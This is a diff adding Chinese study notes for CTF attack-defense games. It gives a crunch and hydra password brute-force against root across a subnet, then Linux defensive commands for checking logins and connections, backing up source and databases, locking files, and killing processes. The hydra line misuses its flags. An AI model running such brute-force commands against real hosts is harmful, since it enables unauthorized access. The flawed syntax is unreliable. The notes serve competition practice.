@@ -5,6 +5,64 @@ tags: 学习笔记
 
 
 
+## 攻击
+
+### crunch + hydra
+
+```
+crunch 10 10 -t 201800%%% -o password.txt
+hydra -u root -p password.txt -l 192.168.9.0/24
+```
+
+### 防御
+
+```bash
+ps -u ctf  # 显示特定用户进程
+
+last -n 5 awk '{print $1}' # 显示最近登录的5个账号
+
+cat /etc/passwd |awk -F ':' '{print $1}' #显示所有账户
+
+netstat -antulp | grep EST # 查看所有链接
+
+lsof -i:3306 # 查看端口号
+
+tar cvf www.tar /var/www/html # 打包源码
+
+scp /tmp ctf@192.168.1.1:/var/www/html # 下载源码
+
+mysqldump -u root -p ctf>ctf.sql # 备份数据库
+
+mysql -u root -p ctf< ctf.sql #恢复数据库
+或
+source ctf.sql
+
+find . -name "*.php" -perm 4777 # 查找777权限的php文件
+
+find ./ -mtime 0 -name "*.php" # 查找24小时内修改过的php文件
+
+    # 配置文件包含文件
+    
+chattr -R +i /var/www/html # 锁定文件
+    
+tcpdump -s 0 -w ctf.pcap port 9999
+
+alias curl="echo flag{1a5d51c54515649463521}"
+
+unalias
+```
+
+### 杀进程
+
+```
+kill [pid]
+killall [进程名]
+pkill [进程名]
+pkill -u [用户名]
+```
+
+
+
 ## 权限维持
 
 ### linux 反弹 shell
